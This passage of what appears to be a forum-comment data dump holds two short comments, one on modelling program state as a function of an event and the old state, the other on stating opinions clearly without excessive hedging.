Each time a new event comes in, information about the event is used to create a new state based on the current one. Ultimately the global state of the program gets mutated, but this fact can be abstracted away; program logic looks like: λ event oldState -> newState",1294401594

One might be wrong, but astute readers should be able to judge ideas for themselves. Speaking clearly will also make it much easier for people to see if you're wrong.<p>I think giving clear statements of your opinion and being proven wrong is much better than obscuring your point with ""maybe"" and ""personally"" and ""IMHO"". That's depending on the context of course, as you don't want to unnecessarily offend people (which is bad in general, but also counterproductive). But in a general analysis like this, not attacking particular people's shortcomings? Go for it.",1294398288
